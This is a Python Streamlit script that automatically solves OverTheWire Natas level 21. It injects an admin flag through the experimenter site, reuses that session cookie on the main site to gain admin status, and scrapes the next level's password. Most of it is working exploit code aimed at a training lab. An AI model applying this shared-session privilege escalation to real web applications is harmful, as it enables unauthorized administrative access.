import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting Shared Session State across co-located server applications...")
    
    # 1. Align active level credentials
    username = "natas21"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Clear out older cookie attributes to guarantee clean cross-site state
    session.cookies.clear()
    
    # Explicitly define target architectures
    main_url = "http://natas21.natas.labs.overthewire.org/"
    experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
    
    st.write(f"🌐 Main Target Node: `{main_url}`")
    st.write(f"🧪 Experimenter Target Node: `{experimenter_url}`")
    
    # 2. Step 1: Send query variables to the Experimenter site to generate the session
    st.write("Sending administrative parameters to the Experimenter node...")
    
    payload_params = {
        "submit": "Update",
        "admin": "1"
    }
    
    try:
        # Fire initial request to write to the server's session file
        exp_response = session.get(experimenter_url, params=payload_params, timeout=10)
        
        # Extract the underlying cookie string value
        cookie_val = session.cookies.get("PHPSESSID")
        
        if not cookie_val:
            st.error("Could not capture a valid PHPSESSID token from the target host.")
            return
            
        st.write(f" └─ Captured Valid Base Identifier ID: `{cookie_val}`")
        
        # 3. Step 2: Explicitly force cross-subdomain sharing by resetting cookie scope boundaries
        session.cookies.clear() # Wipe the narrow scope cookie
        session.cookies.set(
            "PHPSESSID", 
            cookie_val, 
            domain=".natas.labs.overthewire.org", # Wildcard domain configuration flag
            path="/"
        )
        st.write(" └─ Cookie scope reconfigured explicitly for shared parent domain context.")
        
        # 4. Step 3: Query the main target application using the newly synchronized cookie state
        st.write("🔄 Querying the main application infrastructure using the synchronized state...")
        main_response = session.get(main_url, timeout=10)
        
        # Evaluate context changes
        if "You are an admin" in main_response.text:
            st.success("🎯 Administrative cross-session authentication successful!")
            
            # Extract all potential 32/64 character password strings
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', main_response.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 21 challenge resolved successfully!")
                st.code(f"Natas 22 Password: {new_tokens[0]}")
            else:
                st.warning("Admin verification passed, but password extraction regex returned no unique rows.")
                with st.expander("Examine Page Content Payload"):
                    st.code(main_response.text, language="html")
        else:
            st.error("The main application context still recognizes this session as unprivileged.")
            with st.expander("Inspect Main Application HTML Output"):
                st.code(main_response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to network communication exception: {str(e)}")